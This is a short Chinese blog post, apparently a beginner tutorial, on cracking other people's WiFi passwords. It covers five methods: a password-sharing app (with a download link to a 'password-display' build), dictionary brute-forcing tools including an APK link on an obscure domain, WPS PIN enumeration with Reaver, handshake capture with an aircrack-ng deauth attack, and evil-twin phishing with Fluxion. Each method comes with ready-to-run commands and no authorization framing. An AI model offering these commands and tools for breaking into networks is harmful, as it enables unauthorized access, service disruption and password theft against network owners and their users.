网络安全入门01 - 无线密码

· 2024-03-25 · # WiFi # 破解 # 技术类

1、WiFi万能钥匙

  • 原理
    收集用户手机上成功连接过的WiFi账号和密码，并上传、存储到App的服务器上，等到附近的蹭网者搜索到同一个网络时，该App就可以根据附近热点的配置信息，从服务器上自动匹配并取得相应的密码，通过数据流量发送到手机端，从而完成WiFi连网。

  • WiFi万能钥匙显示密码版

    链接：https://www.123pan.com/s/MgCGjv-83Gkv.html

2、WiFi控制模块(PyWiFi、幻影WiFi等)

  • 原理
    编写程序调用系统网卡，不断尝试字典中密码连接WiFi，从而完成WiFi破解。由于单个网卡的限制，每次只能有一个连接，而且尝试一个密码需要2s左右，所以只能跑小而美的字典。

  • PyWiFi/幻影WiFi

    PyWiFi链接：https://pypi.org/project/pywifi/
幻影Wifi：https://down3.0f2.cn/download2/202308/25/004a7390a5482a83a2ad96e4bebc53b7.apk

3、Pin码枚举

  • 原理
    当路由器启用WPS功能后，会随机生成1个8位数的Pin码，通过暴力枚举Pin码(共有11000个可能)，从而完成WiFi破解。ps：现在的路由器基本上都有WPS防护

  • Reaver

    链接：https://github.com/t6x/reaver-wps-fork-t6x

  • 命令

    开启网卡监听模式》airmon-ng start 网卡名
查看附近WPS路由器》wash -i 网卡名+mon
开始Pin破解》reaver -i 网卡名+mon -b BSSID -vv

4、HandShark包破解

  • 原理
    通过嗅探并保存路由器与设备间正确密码交互数据包到本地文件，然后使用同样的加密算法加密字典中每行密码与文件中的密码hash进行对比，从而完成WiFi破解。

  • Aircrack-ng

    链接：https://github.com/aircrack-ng/aircrack-ng

  • 命令

    开启网卡监听模式》airmon-ng start 网卡名
获取周围无线概况》airodump-ng 网卡名+mon
嗅探无线网络handshake》airodump-ng -c 11 -w test 网卡名+mon
deauth攻击断开连接》aireplay-ng -0 1000 -a AP的MAC -c 客户端的mac 网卡名+mon

5、钓鱼WiFi获取

  • 原理
    通过仿照正常的WIFI搭建一个同样名称、BSSID、MAC等信息的热点，然后通过对WiFi进行拒绝服务攻击或者提供比合法WiFi更强的信号迫使无线客户端连接到伪热点上，然后通过劫持网页让用户输入WiFi密码。

  • Fluxion

    链接：https://github.com/FluxionNetwork/fluxion
